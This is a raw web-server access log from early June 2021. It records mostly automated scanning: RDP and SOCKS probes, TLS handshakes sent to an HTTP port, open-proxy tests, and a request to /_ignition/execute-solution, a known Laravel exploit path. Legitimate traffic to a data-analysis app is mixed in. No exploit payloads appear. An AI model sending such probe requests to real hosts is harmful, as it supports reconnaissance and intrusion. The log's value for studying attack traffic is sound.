184.105.247.194 - - [31/May/2021 01:50:46] "[33mGET / HTTP/1.1[0m" 404 -
192.111.134.203 - - [31/May/2021 05:36:26] code 400, message Bad request syntax ('\x00\x00\x00àZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x05\x01=K\x00\x00\x01\x01n\x01\x06')
192.111.134.203 - - [31/May/2021 05:36:26] "[35m[1m   àZ          =K  n[0m" HTTPStatus.BAD_REQUEST -
209.141.46.116 - - [31/May/2021 08:31:34] "[33mGET /console/login/LoginForm.jsp HTTP/1.1[0m" 404 -
185.216.140.35 - - [31/May/2021 08:49:42] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x02\x00\x00\x00')
185.216.140.35 - - [31/May/2021 08:49:42] "[35m[1m  à          [0m" HTTPStatus.BAD_REQUEST -
118.126.124.172 - - [31/May/2021 11:21:11] "[33mGET / HTTP/1.1[0m" 404 -
161.189.192.94 - - [31/May/2021 12:06:36] code 400, message Bad request syntax ('\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x10\x04\x01.\x05\x00\x00\x00\x00\x81I¨À\x00\x0c)\x83z»\x01\x00zÚf\x00\x8d\x16Ò~\x9dU\x05ñ\x1fi»©\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ÃÐ¢|¦v½ó\x1eOÑËÜ®Ëd')
161.189.192.94 - - [31/May/2021 12:06:36] "[35m[1m   TZ         .    I¨À )z» zÚf Ò~Uñi»©                ÃÐ¢|¦v½óOÑËÜ®Ëd[0m" HTTPStatus.BAD_REQUEST -
167.248.133.40 - - [31/May/2021 15:41:31] "[33mGET / HTTP/1.1[0m" 404 -
167.248.133.40 - - [31/May/2021 15:41:32] "[33mGET / HTTP/1.1[0m" 404 -
35.194.76.71 - - [31/May/2021 18:21:01] "[33mGET / HTTP/1.1[0m" 404 -
35.194.76.71 - - [31/May/2021 18:21:02] code 400, message Bad request syntax ("\x16\x03\x01\x01N\x01\x00\x01J\x03\x03\x91^\r(_äÿ\x82B(k¦.\x1b\x11=edÈý'#Èù\x04\x85w~\x1cø4\x93 \x8aÀªÔ\x0e:¯g\xadË4ß@\x926¢xYs\x8eX^\\\x8a¢°5\x7f\x9d\x8a.Ø\x00v\x13\x02\x13\x03\x13\x01À/À+À0À,\x00\x9eÀ'\x00gÀ(\x00k\x00£\x00\x9fÌ©Ì¨ÌªÀ¯À\xadÀ£À\x9fÀ]ÀaÀWÀS\x00¢À®À¬À¢À\x9eÀ\\À`ÀVÀRÀ$\x00jÀ#\x00@À")
35.194.76.71 - - [31/May/2021 18:21:02] "[35m[1mN J^(_äÿB(k¦.=edÈý'#Èùw~ø4 ÀªÔ:¯g­Ë4ß@6¢xYsX^\¢°5.Ø vÀ/À+À0À, À' gÀ( k £ Ì©Ì¨ÌªÀ¯À­À£ÀÀ]ÀaÀWÀS ¢À®À¬À¢ÀÀ\À`ÀVÀRÀ$ jÀ# @À[0m" HTTPStatus.BAD_REQUEST -
185.202.2.149 - - [31/May/2021 20:03:47] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
185.202.2.149 - - [31/May/2021 20:03:47] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
64.62.197.92 - - [31/May/2021 20:22:42] "[33mGET / HTTP/1.1[0m" 404 -
122.228.19.80 - - [31/May/2021 22:28:27] code 400, message Bad request syntax ('\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x010I\x00\x00\x00\x00\x80\x0b¨À\x00\x0c)t F\x07\x00tsXrcsXYs9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00bbXcsXctst\x00\x00\x00\x00\x00\x00')
122.228.19.80 - - [31/May/2021 22:28:27] "[35m[1m   TZ          0I    ¨À )t F tsXrcsXYs9                      bbXcsXctst      [0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [31/May/2021 22:42:49] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [31/May/2021 22:42:49] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [31/May/2021 23:08:11] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [31/May/2021 23:08:11] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [01/Jun/2021 01:55:05] "[33mGET http://passport.baidu.com/ HTTP/1.1[0m" 404 -
47.241.193.60 - - [01/Jun/2021 01:55:30] code 400, message Bad request syntax ('\x05\x01\x00')
47.241.193.60 - - [01/Jun/2021 01:55:30] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [01/Jun/2021 01:55:34] code 400, message Bad request syntax ('\x04\x01\x00Pg)§ê\x00')
47.241.193.60 - - [01/Jun/2021 01:55:34] "[35m[1m Pg)§ê [0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [01/Jun/2021 01:55:58] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [01/Jun/2021 01:55:58] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
142.93.153.150 - - [01/Jun/2021 04:23:05] "[33mGET / HTTP/1.0[0m" 404 -
162.142.125.37 - - [01/Jun/2021 06:56:13] "[33mGET / HTTP/1.1[0m" 404 -
162.142.125.37 - - [01/Jun/2021 06:56:13] "[33mGET / HTTP/1.1[0m" 404 -
170.130.187.14 - - [01/Jun/2021 10:38:34] "[33mGET / HTTP/1.1[0m" 404 -
45.155.205.209 - - [01/Jun/2021 10:42:42] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [01/Jun/2021 10:42:42] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [01/Jun/2021 12:27:18] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [01/Jun/2021 12:27:18] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
113.57.237.25 - - [01/Jun/2021 13:09:09] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:09:09] "[37mPOST /login HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:09:11] "[37mGET /dataSet?page=1&limit=10 HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:09:14] "[37mGET /dataSet?page=1&limit=10 HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:09:21] "[37mGET /ClassifyRecords?page=1&limit=10 HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:09:26] "[37mOPTIONS /statistics/p-value?Algorithm=DES&Mode=ECB HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:09:27] "[37mGET /statistics/p-value?Algorithm=DES&Mode=ECB HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:09:31] "[37mOPTIONS /selectFeaturesGenerate HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:09:31] "[37mPOST /selectFeaturesGenerate HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:09:43] "[37mGET /ClassifyRecords?page=1&limit=10 HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:11:57] "[37mOPTIONS /personalLog HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:11:57] "[37mPOST /personalLog HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:12:00] "[37mOPTIONS /userInform HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:12:00] "[37mPOST /userInform HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:12:03] "[37mOPTIONS /consoleLog HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:12:03] "[37mPOST /consoleLog HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:12:09] "[37mGET /ClassifyRecords?page=1&limit=10 HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:12:13] "[37mGET /dataSet?page=1&limit=10 HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:12:15] "[37mOPTIONS /selectFeaturesGenerate HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:12:15] "[37mPOST /selectFeaturesGenerate HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:12:18] "[37mOPTIONS /statistics/p-value?Algorithm=DES&Mode=ECB HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:12:19] "[37mGET /statistics/p-value?Algorithm=DES&Mode=ECB HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:13:50] "[37mGET /ClassifyRecords?page=1&limit=10 HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:13:55] "[37mGET /dataSet?page=1&limit=10 HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:13:57] "[37mOPTIONS /personalLog HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:13:57] "[37mPOST /personalLog HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:14:13] "[37mOPTIONS /PackageCapture?username=feifei&userdegree=Advanced HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:14:13] "[37mGET /PackageCapture?username=feifei&userdegree=Advanced HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:22:11] "[37mOPTIONS /personalLog HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:22:11] "[37mPOST /personalLog HTTP/1.1[0m" 200 -
74.120.14.53 - - [01/Jun/2021 13:22:12] "[33mGET / HTTP/1.1[0m" 404 -
113.57.237.25 - - [01/Jun/2021 13:22:12] "[37mGET /ClassifyRecords?page=1&limit=10 HTTP/1.1[0m" 200 -
74.120.14.53 - - [01/Jun/2021 13:22:12] "[33mGET / HTTP/1.1[0m" 404 -
113.57.237.25 - - [01/Jun/2021 13:22:16] "[37mGET /dataSet?page=1&limit=10 HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:22:17] "[37mOPTIONS /selectFeaturesGenerate HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:22:17] "[37mPOST /selectFeaturesGenerate HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:22:18] "[37mOPTIONS /statistics/p-value?Algorithm=DES&Mode=ECB HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:22:19] "[37mGET /statistics/p-value?Algorithm=DES&Mode=ECB HTTP/1.1[0m" 200 -
45.155.205.209 - - [01/Jun/2021 14:07:46] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [01/Jun/2021 14:07:46] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
185.220.205.196 - - [01/Jun/2021 15:43:13] code 400, message Bad request syntax ('\x16\x03\x01\x00u\x01\x00\x00q\x03\x03¸Ìs\x991\x13Ò K\\)Èn½¼_NÅ\r§l\x06^0/\x0eß¡äs·{\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\tÀ\x14À')
185.220.205.196 - - [01/Jun/2021 15:43:13] "[35m[1m u  q¸Ìs1Ò K\)Èn½¼_NÅ§l^0/ß¡äs·{  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
106.75.136.67 - - [01/Jun/2021 18:01:05] "[33mGET / HTTP/1.0[0m" 404 -
106.75.136.67 - - [01/Jun/2021 18:01:05] "[33mGET / HTTP/1.0[0m" 404 -
106.75.172.167 - - [01/Jun/2021 18:01:48] "[33mGET / HTTP/1.1[0m" 404 -
47.241.193.60 - - [01/Jun/2021 18:12:21] code 400, message Bad request syntax ('\x04\x01\x00Pg)§ê\x00')
47.241.193.60 - - [01/Jun/2021 18:12:21] "[35m[1m Pg)§ê [0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [01/Jun/2021 18:12:49] "[33mGET http://passport.baidu.com/ HTTP/1.1[0m" 404 -
47.241.193.60 - - [01/Jun/2021 18:13:27] code 400, message Bad request syntax ('\x05\x01\x00')
47.241.193.60 - - [01/Jun/2021 18:13:27] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
117.73.9.5 - - [01/Jun/2021 18:14:18] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00')
117.73.9.5 - - [01/Jun/2021 18:14:18] "[35m[1m  à          [0m" HTTPStatus.BAD_REQUEST -
123.14.253.33 - - [01/Jun/2021 18:17:55] code 400, message Bad request syntax ('\x05\x03\x00\x01\x02')
123.14.253.33 - - [01/Jun/2021 18:17:55] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
185.202.2.149 - - [01/Jun/2021 18:40:21] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
185.202.2.149 - - [01/Jun/2021 18:40:21] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [02/Jun/2021 00:08:37] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [02/Jun/2021 00:08:37] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
185.202.2.149 - - [02/Jun/2021 03:20:58] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
185.202.2.149 - - [02/Jun/2021 03:20:58] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
162.142.125.128 - - [02/Jun/2021 04:05:43] "[33mGET / HTTP/1.1[0m" 404 -
161.189.134.11 - - [02/Jun/2021 05:07:28] code 400, message Bad request syntax ('{\x01\x00\x1615888888888À¨\x90Á\x13\x8a{')
161.189.134.11 - - [02/Jun/2021 05:07:28] "[35m[1m{ 15888888888À¨Á{[0m" HTTPStatus.BAD_REQUEST -
161.189.192.94 - - [02/Jun/2021 05:13:01] code 400, message Bad HTTP/0.9 request type ('xx')
161.189.192.94 - - [02/Jun/2021 05:13:01] "[35m[1mxxSA52b -[0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [02/Jun/2021 05:14:15] code 400, message Bad request syntax ('&&&&~\x04»8ÅaýT\x07P.VJÃ\x04;\x13\x0600-0C-29-B1-35-79')
161.189.134.11 - - [02/Jun/2021 05:14:15] "[35m[1m&&&&~»8ÅaýTP.VJÃ;00-0C-29-B1-35-79[0m" HTTPStatus.BAD_REQUEST -
161.189.192.94 - - [02/Jun/2021 05:22:35] code 400, message Bad request syntax ('\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x10\x04\x01.\x05\x00\x00\x00\x00\x81I¨À\x00\x0c)\x83z»\x01\x00zÚf\x00\x8d\x16Ò~\x9dU\x05ñ\x1fi»©\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ÃÐ¢|¦v½ó\x1eOÑËÜ®Ëd')
161.189.192.94 - - [02/Jun/2021 05:22:35] "[35m[1m   TZ         .    I¨À )z» zÚf Ò~Uñi»©                ÃÐ¢|¦v½óOÑËÜ®Ëd[0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [02/Jun/2021 05:29:14] code 400, message Bad request syntax ('~\x00\x02\x00\x00\x01\x88\x88\x88\x88\x88\x03¥-~')
161.189.134.11 - - [02/Jun/2021 05:29:14] "[35m[1m~   ¥-~[0m" HTTPStatus.BAD_REQUEST -
161.189.192.94 - - [02/Jun/2021 05:31:22] code 400, message Bad request syntax ('[\x00\x00\x00H\x00\x00\x00\x01\x10\x01\x00\x01\x04j\x00\x00\x01\x00\x00\x00\x00')
161.189.192.94 - - [02/Jun/2021 05:31:22] "[35m[1m[   H    j      [0m" HTTPStatus.BAD_REQUEST -
161.189.192.94 - - [02/Jun/2021 05:37:57] code 400, message Bad HTTP/0.9 request type ('\x02¤Uÿ\x00\x00\x00')
161.189.192.94 - - [02/Jun/2021 05:37:57] "[35m[1m¤Uÿ   [0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [02/Jun/2021 05:39:31] code 400, message Bad request syntax ('~~\x01\x00\x124Vx\x124/\x00\x08\x02\x00\x03Y\x10\x11\x15Q\x11\x03kÊ')
161.189.134.11 - - [02/Jun/2021 05:39:31] "[35m[1m~~ 4Vx4/  YQkÊ[0m" HTTPStatus.BAD_REQUEST -
161.189.192.94 - - [02/Jun/2021 05:44:59] code 400, message Bad request syntax ('333766643833656338616434363333643963363962386536653538383937393235613033653338636434')
161.189.192.94 - - [02/Jun/2021 05:44:59] "[35m[1m333766643833656338616434363333643963363962386536653538383937393235613033653338636434[0m" HTTPStatus.BAD_REQUEST -
8.129.111.49 - - [02/Jun/2021 06:06:06] "[33mPOST /_ignition/execute-solution HTTP/1.1[0m" 404 -
45.155.205.209 - - [02/Jun/2021 08:03:13] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [02/Jun/2021 08:03:13] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
184.105.139.69 - - [02/Jun/2021 08:08:19] "[33mGET / HTTP/1.1[0m" 404 -
167.248.133.40 - - [02/Jun/2021 08:47:46] "[33mGET / HTTP/1.1[0m" 404 -
167.248.133.40 - - [02/Jun/2021 08:47:46] "[33mGET / HTTP/1.1[0m" 404 -
45.155.205.209 - - [02/Jun/2021 11:49:12] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [02/Jun/2021 11:49:12] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [02/Jun/2021 13:11:57] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [02/Jun/2021 13:11:57] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [02/Jun/2021 14:37:07] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [02/Jun/2021 14:37:07] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
193.106.29.74 - - [02/Jun/2021 15:24:19] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
193.106.29.74 - - [02/Jun/2021 15:24:19] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
113.57.176.189 - - [02/Jun/2021 15:28:26] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
113.57.176.189 - - [02/Jun/2021 15:28:26] "[37mPOST /login HTTP/1.1[0m" 200 -
113.57.176.189 - - [02/Jun/2021 15:28:30] "[37mGET /dataSet?page=1&limit=10 HTTP/1.1[0m" 200 -
113.57.176.189 - - [02/Jun/2021 15:28:31] "[37mOPTIONS /selectFeaturesGenerate HTTP/1.1[0m" 200 -
113.57.176.189 - - [02/Jun/2021 15:28:31] "[37mPOST /selectFeaturesGenerate HTTP/1.1[0m" 200 -
113.57.176.189 - - [02/Jun/2021 15:28:33] "[37mPOST /selectFeaturesGenerate HTTP/1.1[0m" 200 -
113.57.176.189 - - [02/Jun/2021 15:28:34] "[37mOPTIONS /statistics/p-value?Algorithm=DES&Mode=ECB HTTP/1.1[0m" 200 -
113.57.176.189 - - [02/Jun/2021 15:28:35] "[37mGET /statistics/p-value?Algorithm=DES&Mode=ECB HTTP/1.1[0m" 200 -
193.106.29.74 - - [02/Jun/2021 16:43:16] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
193.106.29.74 - - [02/Jun/2021 16:43:16] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
113.57.237.10 - - [02/Jun/2021 21:18:18] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
113.57.237.10 - - [02/Jun/2021 21:18:18] "[37mPOST /login HTTP/1.1[0m" 200 -
113.57.237.10 - - [02/Jun/2021 21:18:22] "[37mGET /dataSet?page=1&limit=10 HTTP/1.1[0m" 200 -
113.57.237.10 - - [02/Jun/2021 21:18:25] "[37mOPTIONS /selectFeaturesGenerate HTTP/1.1[0m" 200 -
113.57.237.10 - - [02/Jun/2021 21:18:25] "[37mPOST /selectFeaturesGenerate HTTP/1.1[0m" 200 -
113.57.237.10 - - [02/Jun/2021 21:18:35] "[37mGET /ClassifyRecords?page=1&limit=10 HTTP/1.1[0m" 200 -
89.248.165.107 - - [02/Jun/2021 21:21:33] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
89.248.165.107 - - [02/Jun/2021 21:21:33] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
89.248.165.107 - - [02/Jun/2021 21:40:29] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
89.248.165.107 - - [02/Jun/2021 21:40:29] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
89.248.165.103 - - [02/Jun/2021 21:40:36] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x02\x00\x00\x00')
89.248.165.103 - - [02/Jun/2021 21:40:36] "[35m[1m  à          [0m" HTTPStatus.BAD_REQUEST -
89.248.165.107 - - [02/Jun/2021 21:47:32] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
89.248.165.107 - - [02/Jun/2021 21:47:32] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
89.248.165.107 - - [02/Jun/2021 21:56:25] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
89.248.165.107 - - [02/Jun/2021 21:56:25] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
89.248.165.107 - - [02/Jun/2021 22:03:16] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
89.248.165.107 - - [02/Jun/2021 22:03:16] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [02/Jun/2021 23:41:44] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [02/Jun/2021 23:41:44] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [03/Jun/2021 01:50:26] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [03/Jun/2021 01:50:26] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
167.248.133.56 - - [03/Jun/2021 02:17:55] "[33mGET / HTTP/1.1[0m" 404 -
167.248.133.56 - - [03/Jun/2021 02:17:55] "[33mGET / HTTP/1.1[0m" 404 -
117.73.9.5 - - [03/Jun/2021 06:42:04] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00')
117.73.9.5 - - [03/Jun/2021 06:42:04] "[35m[1m  à          [0m" HTTPStatus.BAD_REQUEST -
216.218.206.69 - - [03/Jun/2021 08:12:51] "[33mGET / HTTP/1.1[0m" 404 -
101.251.200.219 - - [03/Jun/2021 10:24:18] code 400, message Bad request syntax ('\x16\x03\x01\x01"\x01\x00\x01\x1e\x03\x03{ªRÔv\x91JÙ\x02c\x9aseyzbM¹©\x93\x86¸\x1e\\\x0ccj\x92ß\x9e®\t\x00\x00\x88À0À,À(À$À\x14À')
101.251.200.219 - - [03/Jun/2021 10:24:18] "[35m[1m" {ªRÔvJÙcseyzbM¹©¸\cjß®	  À0À,À(À$ÀÀ[0m" HTTPStatus.BAD_REQUEST -
101.251.200.219 - - [03/Jun/2021 10:24:18] code 400, message Bad request version ('Õç³¢cþÖö\x00\x00\x88À0À,À(À$À\x14À')
101.251.200.219 - - [03/Jun/2021 10:24:18] "[35m[1m" dô-JÏM8Î|ëº\GÃhá ¨.ôÕç³¢cþÖö  À0À,À(À$ÀÀ[0m" HTTPStatus.BAD_REQUEST -
101.251.200.219 - - [03/Jun/2021 10:24:18] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00Æ\x01\x00\x00Â\x03\x02\x96\x83\x07l[|_\x0f\x13ÂK\x7f\x08Ì\x8eæ=dß4üsÎ/')
101.251.200.219 - - [03/Jun/2021 10:24:18] "[35m[1m Æ  Âl[|_ÂKÌæ=dß4üsÎ/]DMw  PÀÀ[0m" HTTPStatus.BAD_REQUEST -
101.251.200.219 - - [03/Jun/2021 10:24:18] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00Æ\x01\x00\x00Â\x03\x01\x11\x87xCQ\x11Â')
101.251.200.219 - - [03/Jun/2021 10:24:18] "[35m[1m Æ  ÂxCQÂ	J43öµ5V¡Ýøk¨<ßDnq÷â÷w  PÀÀ[0m" HTTPStatus.BAD_REQUEST -
101.251.200.219 - - [03/Jun/2021 10:24:18] "[33mGET / HTTP/1.1[0m" 404 -
45.155.205.209 - - [03/Jun/2021 12:02:57] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [03/Jun/2021 12:02:57] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
74.120.14.54 - - [03/Jun/2021 12:33:31] "[33mGET / HTTP/1.1[0m" 404 -
74.120.14.54 - - [03/Jun/2021 12:33:33] "[33mGET / HTTP/1.1[0m" 404 -
45.155.205.209 - - [03/Jun/2021 14:35:29] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [03/Jun/2021 14:35:29] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [03/Jun/2021 15:11:04] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [03/Jun/2021 15:11:04] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [03/Jun/2021 15:49:11] code 400, message Bad request syntax ('\x05\x01\x00')
47.241.193.60 - - [03/Jun/2021 15:49:11] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [03/Jun/2021 15:49:20] code 400, message Bad request syntax ('\x04\x01\x00Pg)§ê\x00')
47.241.193.60 - - [03/Jun/2021 15:49:20] "[35m[1m Pg)§ê [0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [03/Jun/2021 15:50:14] "[33mGET http://passport.baidu.com/ HTTP/1.1[0m" 404 -
91.241.19.150 - - [03/Jun/2021 16:01:30] code 400, message Bad request version ('\x03\x00(\x00\x04ÿ\x08\x00\x01U\x00\x00\x00MSSQLServer\x00É·\x00\x00')
91.241.19.150 - - [03/Jun/2021 16:01:30] "[35m[1m 4           ( ÿ U   MSSQLServer É·  [0m" HTTPStatus.BAD_REQUEST -
193.106.29.74 - - [03/Jun/2021 16:15:55] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
193.106.29.74 - - [03/Jun/2021 16:15:55] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
35.245.224.63 - - [03/Jun/2021 17:18:15] "[33mGET / HTTP/1.1[0m" 404 -
